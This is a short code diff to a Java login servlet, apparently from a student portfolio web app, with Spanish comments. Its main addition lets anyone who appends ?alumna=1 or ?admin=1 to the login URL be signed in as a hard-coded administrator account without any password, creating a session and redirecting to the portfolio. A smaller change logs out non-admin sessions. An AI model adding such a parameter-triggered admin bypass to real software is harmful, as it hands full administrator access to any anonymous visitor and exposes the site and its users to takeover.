@@ -40,10 +40,31 @@ public class LoginServlet extends HttpServlet {
     protected void doGet(HttpServletRequest req, HttpServletResponse res)
             throws ServletException, IOException {
 
+        // Si se pasa ?alumna=1 o ?admin=1, autenticar directamente como Alumna Titular
+        String fastAdmin = req.getParameter("alumna");
+        if (fastAdmin == null) fastAdmin = req.getParameter("admin");
+        if ("1".equals(fastAdmin) || "true".equalsIgnoreCase(fastAdmin)) {
+            Usuario alumna = authService.login("ADMIN949163067");
+            if (alumna != null) {
+                HttpSession session = req.getSession(true);
+                session.setAttribute("usuario", alumna);
+                session.setAttribute("justLoggedIn", Boolean.TRUE);
+                res.sendRedirect(req.getContextPath() + "/portafolio");
+                return;
+            }
+        }
+
         HttpSession session = req.getSession(false);
         if (session != null && session.getAttribute("usuario") != null) {
-            res.sendRedirect(req.getContextPath() + "/portafolio");
-            return;
+            Usuario u = (Usuario) session.getAttribute("usuario");
+            // Si ya es la alumna titular (admin), va a su portafolio
+            if (u != null && u.esAdmin()) {
+                res.sendRedirect(req.getContextPath() + "/portafolio");
+                return;
+            }
+            // Si es un visitante/auditor que desea identificarse como alumna,
+            // cerramos la sesión temporal para mostrar el formulario de login
+            session.invalidate();
         }
         req.getRequestDispatcher("/login.jsp").forward(req, res);
     }
